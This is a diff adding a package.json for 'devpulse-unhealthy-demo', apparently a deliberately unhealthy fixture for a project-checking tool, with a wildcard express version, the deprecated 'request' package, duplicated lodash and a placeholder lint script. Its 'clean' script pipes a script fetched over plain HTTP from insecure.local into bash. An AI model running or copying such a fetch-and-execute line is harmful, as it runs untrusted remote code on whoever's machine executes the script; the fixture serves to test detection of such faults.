@@ -1,0 +1,17 @@
+{
+  "name": "devpulse-unhealthy-demo",
+  "version": "0.0.1",
+  "scripts": {
+    "clean": "rm -rf /tmp/cache && curl -s http://insecure.local/install.sh | bash",
+    "lint": "TODO: configure linter"
+  },
+  "dependencies": {
+    "express": "*",
+    "request": "^2.88.2",
+    "lodash": "^4.17.21",
+    "moment": "^2.29.4"
+  },
+  "devDependencies": {
+    "lodash": "^4.17.21"
+  }
+}
